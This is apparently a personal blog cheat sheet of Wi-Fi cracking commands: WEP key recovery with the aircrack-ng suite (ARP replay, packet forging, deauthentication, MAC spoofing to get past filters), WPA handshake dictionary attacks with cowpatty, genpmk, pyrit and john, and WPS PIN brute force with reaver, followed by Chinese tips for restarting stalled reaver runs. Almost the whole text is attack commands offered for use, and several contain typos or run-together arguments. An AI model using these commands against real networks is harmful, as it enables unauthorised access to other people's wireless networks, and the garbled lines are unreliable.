---
title: Wifi Crack summary
date: 2020-02-02 11:40:40
categories:
tags:
---
wep[fms,ptw](2w ivs)
airmon-ng start wlan0
airedump-ng -c 1 --bssid C1:3A:35:4D:E8:C0 -w ./weptest1 mon0
aireplay-ng --arpreplay -b C1:3A:35:4D:E8:C0 -h F8:D3:A8:30:32:DCmon0
aircrack-ng ./weptest-01.cap -0
wep[no client con]
airodump-ng -c 1 --bssid C1:3A:35:4D:E8:C0 -w ./weptest2 mon0
ifconfig mon0 |grep HWaddr
aireplay-ng -1 0 -o 1 -e n-f-u -a C1:3A:35:4D:E8:C0 -hF8:D3:A8:30:32:DC mon0
  aireplay-ng -5 -b C1:3A:35:4D:E8:C0 -h F8:D3:A8:30:32:DC mon0
  or aireplay-ng -4 -b C1:3A:35:4D:E8:C0 -h F8:D3:A8:30:32:DC mon0
packetforge-ng --arp -a C1:3A:35:4D:E8:C0 -h F8:D3:A8:30:32:DC-k 255.255.255.255 -l 255.255.255.25                                                       5 -y fragment-23-32134.xor -wforged_arp
aireplay-ng --interactive -F -r ./forged_arp mon0
aircrack-ng ./weptest2-01.cap -0
wep[hidden ,filter mac]
airmon-ng sta:rt wlan0
airmon-ng start mon0
airodump-ng -c 1 --bssid C1:3A:35:4D:E8:C0 --output-format pcap -wweptest3 mon0
aireplay-ng -0 3 -a C1:3A:35:4D:E8:C0 -c F8:D3:A8:30:32:DCmon0  (explore ssid)
aireplay-ng --arpreplay -b C1:3A:35:4D:E8:C0 -h F8:D3:A8:30:32:DCmon0
aircrack-ng ./weptest3-01.cap
iwconfig wlan0  essid not-for-u key32:35:4D:E8:C0:D3:A8:30:32:D1
iwconfigwlan0
airdecap-ng -w 32:35:4D:E8:C0:D3:A8:30:32:D1./weptest3-01.cap
tshark -i mon0 -R "wlan.fc.type_subtype == 0x0b"-V
ifconfig wlan0 down
ifconfig wlan0 hw ether F8:D3:A8:30:32:DC
ifconfig wlan0 up
iwconfig wlan0 essid not-for-u key32:35:4D:E8:C0:D3:A8:30:32:D1
iwconfig wlan0
function1(receive crack):
john --wordlist=wordlist.txt --rules --stdout |cowpatty -f - -snot-for-u -r wpatest.cap -2
[scattered list]
genpmk -f wpadic -d wpadic.genpmk -s not-for-u
cowpatty -d wpadic.genpmk -r wpatest.cap -s not-for-u -2
[pyrit]
pyirt -e n-f-u create_essid
pyrit -f wpadic.txt import_passwords
pyrit -r wpatest.cap -e n-f-uattack_batch
        or pyrit -i wpadic.txt -o - -e n-f-u passthrough |cowpatty -d - -2-s n-f-u -r wpatest.cap
[WPS reaver use]
airmon-ng start wlan0     //开启监听模式
wash –i mon0         //查看开启wps的无线路由器
airodump-ng mon0          //查看周边AP信息（抓包）
reaver –i mon0 –b MAC –a –S –vv –d 3 –t 3  //开始穷举PIN码
reaver –i mon0 –b MAC –a –S –vv –d 0        //修改默认延迟为0秒
reaver –i mon0 –b MAC –a –S –vv –p xxxx     //从前4位PIN码开始
reaver -i mon0 -b MAC -a -S -vv -d 3 -t 3      //timeout delay

Pin码重复出现死循环解决之道:
当你看到PIN到一定程度，窗口里的PIN码不变、进度百分比也不走，那么，保持原窗口不变，再点击ROOTSHELL图标，新开一个PIN窗口，输入“reaver -i mon0 -b （正在PIN的目标MAC） -a -s -vv ”(注意：这里“S”要小写) 那么，你就会发现原来PIN的窗口，PIN码开始改变，进度开始前进了！而且PIN的时间也大为缩短了！如果是破解到99.99%，执行此部操作就马上弹出正确的pin码和wifi密码，以及路由器的SSID。
当你看到PIN到一定程度，窗口里的PIN码不变、进度百分比也不走，那么，请Ctrl+C停止，然后点击[Reaver]按钮，在弹出的窗口中输入“-a -s –vv“ (注意：这里“S”要小写) 那么，你就会发现原来PIN的窗口，PIN码开始改变，进度开始前进了！而且PIN的时间也大为缩短了！,如果是破解到99.99%，执行此部操作就马上弹出正确的pin码和wifi密码，以及路由器的SSID。

若到90.9%或99.9%还是不出，也可以试试“reaver -i mon0 -b (正在PIN的目标MAC) -v -a -n [-c]”
时间及经验总结，基本90.9%和99.9%的死循环，已经100%成功了.

PIN破密对信号要求极为严格，如果信号稍差，可能导致破密进度变慢或者路由死锁等（重复同一个PIN码 或 timeout）。
特别是1、6默认频道中，有较多的AP，相互干扰。因此，确定网卡放置的最佳位置、方向、角度十分重要。
破解过程中重复同一个PIN码或timeout可随时随地按Ctrl+C终止，reaver会自动保存进度。
若继续破，则再次在终端中发送: reaver -i mon0 -b MAC -vv，这个命令运行后，会让你选y或n，选y后就继续了。
当reaver确定前4位PIN密码后，其工作完成任务进度数值将直接跳跃至90.9%以上，也就是说只剩余一千个密码组合了。总共一万一千个密码。
如果，90.9%进程后死机或停机，请记下PIN前四位数，用指令：
reaver -i mon0 -b MAC -a -vv -p XXXX(PIN前四位数)会从指定PIN段起破密。